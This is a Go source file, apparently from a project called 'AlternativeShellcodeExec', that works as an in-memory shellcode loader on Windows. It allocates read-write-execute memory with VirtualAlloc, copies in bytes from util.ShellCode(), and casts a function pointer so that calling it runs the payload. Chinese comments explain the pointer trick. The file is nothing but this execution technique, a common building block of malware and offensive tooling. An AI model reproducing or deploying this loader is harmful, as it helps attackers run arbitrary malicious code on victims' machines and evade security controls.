package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

func main() {
	op := util.ShellCode()
	const (
		MEM_RESERVE            = 0x2000
		MEM_COMMIT             = 0x1000
		PAGE_EXECUTE_READWRITE = 0x40
	)
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}
	f := func() {}
	//// 将字节切片 sc 的第一个元素的地址转换为一个函数指针
	*(**uintptr)(unsafe.Pointer(&f)) = &addr

	// 调用 f，即调用 sc 中的机器码
	f()
}
